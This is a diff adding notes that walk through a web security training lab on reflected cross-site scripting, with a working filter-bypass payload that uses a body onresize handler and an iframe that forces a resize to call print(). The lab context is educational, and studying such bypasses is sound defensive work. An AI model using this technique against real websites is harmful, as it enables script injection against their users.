@@ -1,0 +1,45 @@
+// Lab: Reflected XSS into HTML context with most tags and attributes blocked
+
+Most tags (<script>, <img>, <svg>, etc.) are blocked.
+
+Most attributes (onerror, onclick, etc.) are blocked.
+
+But some obscure HTML tags are still allowed.
+
+Goal: execute print().
+
+
+// Solution
+
+
+// On Search i Inject the payload
+
+"><body onresize=print()>
+
+which is encoded form 
+
+%22%3E%3Cbody%20onresize=print()%3E
+
+
+
+// Normal tags/events are blocked by WAF
+
+But body + onresize is allowed
+
+onresize fires whenever the page size changes
+
+
+// Why Iframe used
+
+When iframe loads → it changes its own width.
+
+
+// The final payload which we inject in body is 
+
+<iframe src="https://.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+
+// So the decoded version is 
+
+https://YOUR-LAB-ID.web-security-academy.net/?search="><body onresize=print()>
+
